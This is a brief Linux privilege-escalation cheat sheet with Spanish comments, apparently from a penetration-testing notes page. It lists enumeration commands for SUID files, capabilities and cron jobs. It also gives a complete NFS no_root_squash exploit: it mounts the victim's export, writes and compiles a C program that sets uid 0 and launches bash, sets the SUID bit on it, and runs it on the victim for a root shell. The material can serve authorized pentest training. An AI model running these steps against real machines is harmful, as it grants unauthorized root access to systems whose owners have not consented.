#### SUID[](#suid)

find / -perm -u=s -type f 2>/dev/null

#### Capabilities[](#capabilities)

getcap -r / 2>/dev/null

#### 

NFS Root Squashing[](#nfs-root-squashing)

cat /etc/exports

#Si una carpeta tiene la flag “no_root_squash” se puede montar con NFS y los archivos serán creados como root (id 0)

#Desde la máquina atacante

showmount -e <IP_VÍCTIMA>

mkdir /tmp/mountme

mount -o rw,vers=2 <IP_VÍCTIMA>:/tmp /tmp/mountme

echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }’ > /tmp/mountme/x.c

gcc /tmp/mountme/x.c -o /tmp/mountme/x

chmod +s /tmp/mountme/x

#Desde la máquina víctima

./x

#### 

Tareas programadas[](#tareas-programadas)

cat /etc/crontab